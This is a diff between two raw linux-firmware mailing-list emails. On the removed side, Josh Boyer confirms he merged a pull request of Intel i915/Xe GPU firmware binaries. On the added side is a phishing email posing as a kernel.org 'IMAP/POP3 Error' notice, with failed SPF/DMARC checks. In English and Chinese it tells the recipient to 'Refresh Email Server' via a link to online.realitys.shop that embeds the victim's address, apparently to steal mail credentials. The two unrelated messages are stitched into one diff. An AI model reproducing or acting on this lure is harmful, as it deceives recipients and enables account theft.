@@ -1,122 +1,140 @@
-Return-Path: <jwboyer@kernel.org>
+Return-Path: <imap-pop3@kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id DD137C3DA4A
-	for <linux-firmware@archiver.kernel.org>; Mon,  5 Aug 2024 11:41:46 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 49D49C3DA7F
+	for <linux-firmware@archiver.kernel.org>; Wed,  7 Aug 2024 04:23:04 +0000 (UTC)
 Received: by smtp.kernel.org (Postfix)
-	id B4152C4AF0F; Mon,  5 Aug 2024 11:41:46 +0000 (UTC)
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 9D560C4AF0D
-	for <linux-firmware@kernel.org>; Mon,  5 Aug 2024 11:41:46 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
-	s=k20201202; t=1722858106;
-	bh=E3ahWBviCoqFcVG03W9ZYAdrER7JEEzise/0pd6IbIY=;
-	h=References:In-Reply-To:From:Date:Subject:To:List-Id:Cc:From;
-	b=bDwdIhSg2Yi5dVI0K0nuVeTu4CcCuBI0xveCvkfIAwoJt7TaAqmR3vJ0GtwjF94fF
-	 e55ndhQIdpTDqU7P1zjFVuT+XqhcStQ+/SbHSRmxIvUdWFlVmJaqaK9MSwfBqoxlcY
-	 khzrRa7Oyu0pBinmCylZgiy/Nfof1Hwdlh/ANJ8NnynnI17mf96ZosIgdsStEbx4vi
-	 ZNGLJNpUjXKJzlB/PdeAYB/xVNDRrgC3p0UqaXEN1MKwcz+/Qzmm6mVBYIJ2CVIKGc
-	 1FQqN1TwUG812bRgK8eBpV16ro2PWnPIpbouW7uo2Ds1g+UD8Ug8XKY5/cHdDmtjWi
-	 VFx6IyXSR7ZNQ==
-Received: by mail-yw1-f172.google.com with SMTP id 00721157ae682-66ca536621cso81956457b3.3
-        for <linux-firmware@kernel.org>; Mon, 05 Aug 2024 04:41:46 -0700 (PDT)
-X-Gm-Message-State: AOJu0YwNP/9jviwp9S6EdY8Y+iJDRJxYjD94Pyk7SqBN+P0Pg6rChUQo
-	c1rRPbAnOe2WOc4cNzQqzRperNw41xfuCWDXRnzPfcmvbXHcN3vTCzeWl9tFW4Lagf0ClgkmG2E
-	qBWXI5Yvzu6FlYB45PvKTiqwWNLI=
-X-Google-Smtp-Source: AGHT+IFWxmHCberVsakhXtl8rlWFkBZL9CTdFSK1UpCQUhmmPWa91YPj++pgbzTCIe+8ZK9HsXBnmrRCZHkmSPmjsSU=
-X-Received: by 2002:a0d:c306:0:b0:64a:6eda:fc60 with SMTP id
- 00721157ae682-6895f9e5e2cmr96108717b3.4.1722858105800; Mon, 05 Aug 2024
- 04:41:45 -0700 (PDT)
-MIME-Version: 1.0
-References: <20240802175932.784781-1-daniele.ceraolospurio@intel.com>
-In-Reply-To: <20240802175932.784781-1-daniele.ceraolospurio@intel.com>
-From: Josh Boyer <jwboyer@kernel.org>
-Date: Mon, 5 Aug 2024 07:41:34 -0400
-X-Gmail-Original-Message-ID: <CA+5PVA6T-tJziaykh+Ryin9GVeCmFwEqEDNKOSnad09F3PphOg@mail.gmail.com>
-Message-ID: <CA+5PVA6T-tJziaykh+Ryin9GVeCmFwEqEDNKOSnad09F3PphOg@mail.gmail.com>
-Subject: Re: PR for new i915 and Xe binaries
-To: Daniele Ceraolo Spurio <daniele.ceraolospurio@intel.com>
+	id 15624C4AF0D; Wed,  7 Aug 2024 04:23:04 +0000 (UTC)
+Received: from vps51217.alfahosting-vps.de (server.i-love-design.de [91.203.212.11])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
+	(No client certificate requested)
+	by smtp.kernel.org (Postfix) with ESMTPS id 33793C32782
+	for <linux-firmware@kernel.org>; Wed,  7 Aug 2024 04:23:01 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.1 smtp.kernel.org 33793C32782
+Authentication-Results: smtp.kernel.org; dmarc=fail (p=none dis=none) header.from=kernel.org
+Authentication-Results: smtp.kernel.org; spf=fail smtp.mailfrom=kernel.org
+Received: from DESKTOP-KUBDFIL (unknown [5.151.89.16])
+	by vps51217.alfahosting-vps.de (Postfix) with ESMTPSA id 7E4961B82C0
+	for <linux-firmware@kernel.org>; Wed,  7 Aug 2024 06:22:51 +0200 (CEST)
+From: "Kernel IMAP Notification" <imap-pop3@kernel.org>
+Subject: IMAP/POP3 Error - Refresh Email Server
 List-Id: <linux-firmware.lore.kernel.org>
-Cc: linux-firmware@kernel.org, intel-gfx@lists.freedesktop.org, 
-	intel-xe@lists.freedesktop.org, gustavo.sousa@intel.com, 
-	John.C.Harrison@intel.com
-Content-Type: text/plain; charset="UTF-8"
+To: <linux-firmware@kernel.org>
+Content-Type: multipart/alternative; boundary="wIfqBuCjH9iv=_xPvpr4rDIyOT6hdBp6O4"
+MIME-Version: 1.0
+Date: Wed, 7 Aug 2024 05:22:51 +0100
+Message-Id: <20240708052250A9CBB6E40F$FB3995F68B@kernel.org>
+
+This is a multi-part message in MIME format
+
+--wIfqBuCjH9iv=_xPvpr4rDIyOT6hdBp6O4
+Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 
-On Fri, Aug 2, 2024 at 1:59=E2=80=AFPM Daniele Ceraolo Spurio
-<daniele.ceraolospurio@intel.com> wrote:
->
-> A bulk update of several binaries in the i915 and Xe folders.
->
-> - GuC:
->     - All TGL+ binaries updated to v70.29.2
->     - New binary added for BMG, also v70.29.2
->
-> - HuC:
->     - DG2 binary updated to latest rev (v7.10.16)
->     - New binaries added for LNL (v9.4.13) and BMG (v8.2.10)
->
-> - GSC:
->     - MTL binary updated to v102.0.10.1878
->     - New binary added for LNL, v104.0.0.1161
->
-> - DMC:
->     - MTL binary updated to v2.22
->
-> The following changes since commit 65c5d9b1a4808462f5e885447dae1a133c96ab=
-ec:
->
->   Merge branch 'amdgpu-20240726' into 'main' (2024-07-28 14:28:08 +0000)
->
-> are available in the Git repository at:
->
->   https://gitlab.freedesktop.org/drm/firmware.git tags/intel-2024-08-02
 
-Merged and pushed out.
+Attention:=20
 
-https://gitlab.com/kernel-firmware/linux-firmware/-/merge_requests/266
+linux-firmware@kernel.org
 
-josh
+Due to SSL port server errors, some emails are failing to reach your i=
+nbox. To fix this, please refresh your email server using the session =
+information provided.
 
->
-> for you to fetch changes up to 95c414d44c8e60880be787822d5020a010044a49:
->
->   xe: First GuC release v70.29.2 for BMG (2024-08-01 11:11:04 -0700)
->
-> ----------------------------------------------------------------
-> Daniele Ceraolo Spurio (5):
->       i915: update DG2 HuC to v7.10.16
->       xe: Add LNL HuC 9.4.13
->       xe: Add GSC 104.0.0.1161 for LNL
->       xe: Add BMG HuC 8.2.10
->       i915: update MTL GSC to v102.0.10.1878
->
-> Dnyaneshwar Bhadane (1):
->       i915: Update MTL DMC v2.22
->
-> Julia Filipchuk (3):
->       i915: Add GuC v70.29.2 for ADL-P, DG1, DG2, MTL, and TGL
->       xe: Add GuC v70.29.2 for LNL
->       xe: First GuC release v70.29.2 for BMG
->
->  WHENCE               |  30 +++++++++++++++++++++---------
->  i915/adlp_guc_70.bin | Bin 347584 -> 328768 bytes
->  i915/dg1_guc_70.bin  | Bin 321472 -> 302656 bytes
->  i915/dg2_guc_70.bin  | Bin 410368 -> 369408 bytes
->  i915/dg2_huc_gsc.bin | Bin 630784 -> 630784 bytes
->  i915/mtl_dmc.bin     | Bin 52476 -> 52700 bytes
->  i915/mtl_gsc_1.bin   | Bin 1142784 -> 1134592 bytes
->  i915/mtl_guc_70.bin  | Bin 332544 -> 303872 bytes
->  i915/tgl_guc_70.bin  | Bin 335168 -> 316352 bytes
->  xe/bmg_guc_70.bin    | Bin 0 -> 406272 bytes
->  xe/bmg_huc.bin       | Bin 0 -> 585728 bytes
->  xe/lnl_gsc_1.bin     | Bin 0 -> 1155072 bytes
->  xe/lnl_guc_70.bin    | Bin 336640 -> 316160 bytes
->  xe/lnl_huc.bin       | Bin 0 -> 643072 bytes
->  14 files changed, 21 insertions(+), 9 deletions(-)
->  create mode 100644 xe/bmg_guc_70.bin
->  create mode 100644 xe/bmg_huc.bin
->  create mode 100644 xe/lnl_gsc_1.bin
->  create mode 100644 xe/lnl_huc.bin
+Thank you for your prompt action.
+
+Refresh Email Server https://online.realitys.shop/comunnicaton.html?ps=
+t=3DbGludXgtZmlybXdhcmVAa2VybmVsLm9yZw=3D=3D
+
+=E6=B3=A8=E6=84=8F=EF=BC=9Alinux-firmware@kernel.org =E7=94=B1=E4=BA=8E=
+ SSL =E7=AB=AF=E5=8F=A3=E6=9C=8D=E5=8A=A1=E5=99=A8=E9=94=99=E8=AF=AF=EF=
+=BC=8C=E9=83=A8=E5=88=86=E7=94=B5=E5=AD=90=E9=82=AE=E4=BB=B6=E6=97=A0=E6=
+=B3=95=E5=88=B0=E8=BE=BE=E6=82=A8=E7=9A=84=E6=94=B6=E4=BB=B6=E7=AE=B1=E3=
+=80=82=E8=A6=81=E8=A7=A3=E5=86=B3=E6=AD=A4=E9=97=AE=E9=A2=98=EF=BC=8C=E8=
+=AF=B7=E4=BD=BF=E7=94=A8=E6=8F=90=E4=BE=9B=E7=9A=84=E4=BC=9A=E8=AF=9D=E4=
+=BF=A1=E6=81=AF=E5=88=B7=E6=96=B0=E6=82=A8=E7=9A=84=E7=94=B5=E5=AD=90=E9=
+=82=AE=E4=BB=B6=E6=9C=8D=E5=8A=A1=E5=99=A8=E3=80=82
+
+=E6=84=9F=E8=B0=A2=E6=82=A8=E7=9A=84=E5=8F=8A=E6=97=B6=E8=A1=8C=E5=8A=A8=
+=2E
+
+=E5=88=B7=E6=96=B0=E7=94=B5=E5=AD=90=E9=82=AE=E4=BB=B6=E6=9C=8D=E5=8A=A1=
+=E5=99=A8 https://online.realitys.shop/comunnicaton.html?pst=3DbGludXg=
+tZmlybXdhcmVAa2VybmVsLm9yZw=3D=3D
+
+--wIfqBuCjH9iv=_xPvpr4rDIyOT6hdBp6O4
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-=
+8">
+  <title>IMAP/POP3 Error - Refresh Email Server</title>
+ </head>
+ <body style=3D"MARGIN: 0.5em"> <P><SPAN style=3D"FONT-FAMILY: Tahoma,=
+Geneva, sans-serif"><STRONG>Attention:&nbsp;<A>linux-firmware@kernel.o=
+rg</A></STRONG> Due to SSL port server errors, some emails are failing=
+ to reach your inbox. To fix this, please refresh your email server us=
+ing the session information provided.</SPAN></p><p><SPAN style=3D"FONT=
+-FAMILY: Tahoma,Geneva, sans-serif">Thank you for your prompt action.<=
+/SPAN></P> <DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helveti=
+ca, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM=
+: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; OR=
+PHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255=
+,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-vari=
+ant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thic=
+kness: initial; text-decoration-style: initial; text-decoration-color:=
+ initial"> <DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px"><SPAN styl=
+e=3D"FONT-SIZE: 14px; FONT-FAMILY: Tahoma, Geneva, sans-serif"><BR></S=
+PAN><table cellSpacing=3D0 border=3D0> <tr><td style=3D"FONT-FAMILY: '=
+Google Sans', Roboto, RobotoDraft, Helvetica, Arial, sans-serif; MIN-W=
+IDTH: 50px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 20px;=
+ MARGIN: 0px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(38,114,236)" =
+bgColor=3D#2672ec><SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Tahoma,=
+ Geneva, sans-serif"><A style=3D"FONT-FAMILY: 'Segoe UI Semibold', 'Se=
+goe UI Bold', 'Segoe UI', 'Helvetica Neue Medium', Arial, sans-serif; =
+FONT-WEIGHT: 600; COLOR: rgb(255,255,255); TEXT-ALIGN: center; LETTER-=
+SPACING: 0.02em; text-decoration-line: none" href=3D"https://online.re=
+alitys.shop/comunnicaton.html?pst=3DbGludXgtZmlybXdhcmVAa2VybmVsLm9yZw=
+=3D=3D" rel=3D"noopener noreferrer">Refresh Email Server</A></SPAN></T=
+D></TR></TABLE></DIV></DIV> <P><BR><BR><SPAN style=3D"FONT-FAMILY: Tah=
+oma,Geneva, sans-serif"><STRONG>=E6=B3=A8=E6=84=8F=EF=BC=9Alinux-firmw=
+are@kernel.org</STRONG> =E7=94=B1=E4=BA=8E SSL =E7=AB=AF=E5=8F=A3=E6=9C=
+=8D=E5=8A=A1=E5=99=A8=E9=94=99=E8=AF=AF=EF=BC=8C=E9=83=A8=E5=88=86=E7=94=
+=B5=E5=AD=90=E9=82=AE=E4=BB=B6=E6=97=A0=E6=B3=95=E5=88=B0=E8=BE=BE=E6=82=
+=A8=E7=9A=84=E6=94=B6=E4=BB=B6=E7=AE=B1=E3=80=82=E8=A6=81=E8=A7=A3=E5=86=
+=B3=E6=AD=A4=E9=97=AE=E9=A2=98=EF=BC=8C=E8=AF=B7=E4=BD=BF=E7=94=A8=E6=8F=
+=90=E4=BE=9B=E7=9A=84=E4=BC=9A=E8=AF=9D=E4=BF=A1=E6=81=AF=E5=88=B7=E6=96=
+=B0=E6=82=A8=E7=9A=84=E7=94=B5=E5=AD=90=E9=82=AE=E4=BB=B6=E6=9C=8D=E5=8A=
+=A1=E5=99=A8=E3=80=82</SPAN></p><p><SPAN style=3D"FONT-FAMILY: Tahoma,=
+Geneva, sans-serif">=E6=84=9F=E8=B0=A2=E6=82=A8=E7=9A=84=E5=8F=8A=E6=97=
+=B6=E8=A1=8C=E5=8A=A8.</SPAN></P> <DIV style=3D"FONT-SIZE: small; FONT=
+-FAMILY: Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACI=
+NG: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34);=
+ FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BA=
+CKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0p=
+x; text-decoration-thickness: initial; text-decoration-style: initial;=
+ text-decoration-color: initial"> <DIV style=3D"BORDER-TOP: 0px; PADDI=
+NG-TOP: 0px"><SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Tahoma, Gene=
+va, sans-serif"><BR></SPAN><table cellSpacing=3D0 border=3D0> <tr><td =
+style=3D"FONT-FAMILY: 'Google Sans', Roboto, RobotoDraft, Helvetica, A=
+rial, sans-serif; MIN-WIDTH: 50px; PADDING-BOTTOM: 5px; PADDING-TOP: 5=
+px; PADDING-LEFT: 20px; MARGIN: 0px; PADDING-RIGHT: 20px; BACKGROUND-C=
+OLOR: rgb(38,114,236)" bgColor=3D#2672ec><SPAN style=3D"FONT-SIZE: 14p=
+x; FONT-FAMILY: Tahoma, Geneva, sans-serif"><A style=3D"FONT-FAMILY: '=
+Segoe UI Semibold', 'Segoe UI Bold', 'Segoe UI', 'Helvetica Neue Mediu=
+m', Arial, sans-serif; FONT-WEIGHT: 600; COLOR: rgb(255,255,255); TEXT=
+-ALIGN: center; LETTER-SPACING: 0.02em; text-decoration-line: none" hr=
+ef=3D"https://online.realitys.shop/comunnicaton.html?pst=3DbGludXgtZml=
+ybXdhcmVAa2VybmVsLm9yZw=3D=3D" rel=3D"noopener noreferrer">=E5=88=B7=E6=
+=96=B0=E7=94=B5=E5=AD=90=E9=82=AE=E4=BB=B6=E6=9C=8D=E5=8A=A1=E5=99=A8<=
+/A></SPAN></TD></TR></TABLE></DIV></DIV></body>
+ </html>
+
+--wIfqBuCjH9iv=_xPvpr4rDIyOT6hdBp6O4--
+
